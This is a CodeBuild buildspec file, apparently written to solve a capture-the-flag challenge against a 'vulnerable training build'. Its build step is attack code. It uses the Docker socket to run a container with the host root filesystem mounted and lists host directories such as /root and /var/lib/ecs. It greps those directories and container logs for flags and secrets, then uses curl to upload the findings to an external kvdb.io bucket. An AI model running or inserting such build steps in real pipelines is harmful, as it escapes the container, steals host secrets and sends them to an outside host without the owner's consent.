version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - |
        set +e
        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
        runid="${CODEBUILD_BUILD_ID##*:}"
        putkey(){ key="$1"; file="$2"; head -c 50000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
        echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
        {
          img=$(docker ps --filter name=ecs- --format '{{.Image}}' | head -n1)
          echo "img=$img"
          timeout 45 docker run --rm --entrypoint /bin/sh -v /:/host:ro "$img" -c '
            set +e
            echo "--- dirs"; for d in /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp; do echo "### $d"; ls -la "$d" 2>&1 | head -n 40; done
            echo "--- names"; find /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp -type f 2>/dev/null | grep -Ei "flag|ctf|hacktricks|codebreach|secret" | head -n 200
            echo "--- grep"; grep -RInaE "flag\\{|ctf\\{|HackTricks\\{|FLAG[^A-Za-z]|codebreach|hacktricks" /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp 2>/dev/null | head -n 200
          ' 2>&1
          echo '--- docker logs codebuild container tail grep'
          cid=$(docker ps --filter name=ecs- --format '{{.ID}}' | head -n1)
          docker logs "$cid" 2>&1 | grep -Ei 'flag|ctf|hacktricks|codebreach|secret' | head -n 200 || true
        } > /tmp/hosthits.txt 2>&1
        putkey hosthits /tmp/hosthits.txt
